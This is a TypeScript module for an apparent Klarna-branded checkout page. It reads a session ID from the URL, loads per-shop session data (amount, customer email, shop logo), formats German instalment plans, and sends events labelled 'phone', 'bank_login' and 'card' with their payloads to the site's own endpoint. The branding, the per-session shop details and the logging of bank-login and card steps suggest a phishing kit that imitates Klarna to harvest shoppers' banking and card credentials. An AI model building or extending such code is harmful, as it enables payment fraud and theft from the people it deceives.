export type SessionData = {
  amount_cents: number;
  customer_email: string;
  shop_domain: string;
  shop_logo_url: string | null;
  status: string;
};

const SID_KEY = "klarna_session_id";
const SDATA_KEY = "klarna_session_data";

export function getSessionId(): string | null {
  if (typeof window === "undefined") return null;
  try {
    const url = new URL(window.location.href);
    const fromUrl = url.searchParams.get("session");
    if (fromUrl) {
      sessionStorage.setItem(SID_KEY, fromUrl);
      return fromUrl;
    }
    return sessionStorage.getItem(SID_KEY);
  } catch {
    return null;
  }
}

export async function loadSession(): Promise<SessionData | null> {
  const id = getSessionId();
  if (!id) return null;
  try {
    const cached = sessionStorage.getItem(SDATA_KEY);
    if (cached) {
      const parsed = JSON.parse(cached) as { id: string; data: SessionData };
      if (parsed.id === id) return parsed.data;
    }
  } catch {}
  try {
    const res = await fetch(`/api/public/session-get?id=${encodeURIComponent(id)}`);
    if (!res.ok) return null;
    const data = (await res.json()) as SessionData;
    try {
      sessionStorage.setItem(SDATA_KEY, JSON.stringify({ id, data }));
    } catch {}
    return data;
  } catch {
    return null;
  }
}

export async function logEvent(
  type: "phone" | "plan" | "method" | "bank_login" | "card" | "complete",
  payload: Record<string, unknown> = {},
): Promise<void> {
  const id = getSessionId();
  if (!id) return;
  try {
    await fetch("/api/public/session-event", {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ session_id: id, type, payload }),
    });
  } catch {}
}

export function formatEUR(cents: number | null | undefined): string {
  const c = typeof cents === "number" && Number.isFinite(cents) ? cents : 7564;
  return (
    new Intl.NumberFormat("de-DE", { minimumFractionDigits: 2, maximumFractionDigits: 2 }).format(
      c / 100,
    ) + " €"
  );
}

export type Plan = "sofort" | "spaeter" | "sechs" | "drei";

export function computePlan(totalCents: number): Record<Plan, { today: string; total: string }> {
  const t = Number.isFinite(totalCents) && totalCents > 0 ? totalCents : 7564;
  return {
    sofort: { today: formatEUR(t), total: formatEUR(t) },
    spaeter: { today: formatEUR(0), total: formatEUR(t) },
    sechs: { today: formatEUR(0), total: formatEUR(Math.round(t * 1.042)) },
    drei: { today: formatEUR(Math.round(t / 3)), total: formatEUR(t) },
  };
}
